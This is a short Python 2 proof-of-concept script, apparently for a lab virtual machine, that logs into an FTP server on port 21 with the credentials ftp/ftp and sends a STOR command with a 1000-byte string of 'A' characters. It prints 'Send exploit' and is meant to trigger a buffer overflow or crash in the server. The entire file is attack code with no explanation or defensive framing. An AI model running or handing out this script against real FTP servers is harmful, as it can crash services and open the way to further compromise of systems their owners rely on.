from socket import *

IP = "VMIP"
PORT = "21"
ID = "ftp"
PW = "ftp"

data = "A"* 1000    

s = socket(AF_INET, SOCK_STREAM)
s.connect((IP,int(PORT)))
s.send("USER {}\r\n".format(ID))
s.recv(500)
s.send("PASS {}\r\n".format(PW))
s.recv(500)
       
print "[*]Send exploit...",
s.send("STOR {}\r\n".format(data))
print "Done"
